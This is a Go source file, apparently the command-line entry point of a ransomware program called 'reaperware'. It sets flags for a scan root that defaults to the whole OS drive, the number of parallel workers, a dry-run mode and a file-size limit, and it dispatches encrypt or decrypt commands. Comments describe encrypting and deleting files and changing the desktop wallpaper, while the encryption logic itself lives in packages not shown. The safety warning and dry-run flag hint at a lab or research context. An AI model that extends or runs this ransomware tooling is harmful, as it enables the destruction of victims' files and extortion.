// Entry point for reaperware. Flags are defined only here.
//
// Safety: this program can encrypt/delete files. Do not run against production data.
// Typical build/run (from repo root): go build -o /tmp/reaperware ./cmd
//
// Wallpaper / desktop integration is OS-specific (no single portable syscall):
// Windows: PowerShell + user32 via .NET; Linux: gsettings/xfce/feh; macOS: osascript.
package main

import (
	"context"
	"flag"
	"fmt"
	"log"
	"os"
	"os/signal"
	"syscall"
	"time"

	"reaperware/pkg/config"
	"reaperware/pkg/userinput"
)

func main() {
	log.SetFlags(log.LstdFlags | log.Lmicroseconds)

	root := flag.String("root", "", "Directory tree to scan (default: OS root, e.g. / or C:\\)")
	workers := flag.Int("workers", 0, "Parallel file workers (0 means encrypt:5, decrypt:10)")
	dryRun := flag.Bool("dry-run", false, "Log only: do not encrypt/decrypt, delete, or change wallpaper")
	maxFileSize := flag.Int64("max-file-size", 0, "Skip files larger than this many bytes (0=unlimited)")

	flag.Usage = func() {
		fmt.Fprintf(os.Stderr, "Usage:\n  %s [flags] <%s|%s>\n\nFlags:\n", os.Args[0], userinput.Encrypt, userinput.Decrypt)
		flag.PrintDefaults()
		fmt.Fprintf(os.Stderr, "\nExample (dry-run, scoped directory):\n  %s -dry-run -root /tmp/test -workers 2 %s\n", os.Args[0], userinput.Encrypt)
	}

	flag.Parse()

	args := flag.Args()
	if len(args) != 1 {
		flag.Usage()
		os.Exit(2)
	}

	cfg := &config.Run{
		Command:     args[0],
		Root:        *root,
		Workers:     *workers,
		DryRun:      *dryRun,
		MaxFileSize: *maxFileSize,
	}

	if cfg.Workers < 1 {
		switch cfg.Command {
		case userinput.Decrypt:
			cfg.Workers = 10
		default:
			cfg.Workers = 5
		}
	}

	// Graceful shutdown: SIGINT and SIGTERM (SIGTERM may be a no-op on some Windows builds).
	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
	defer stop()

	start := time.Now()
	if err := userinput.Run(ctx, cfg); err != nil {
		log.Fatal(err)
	}
	log.Println("[*] Elapsed:", time.Since(start))
}
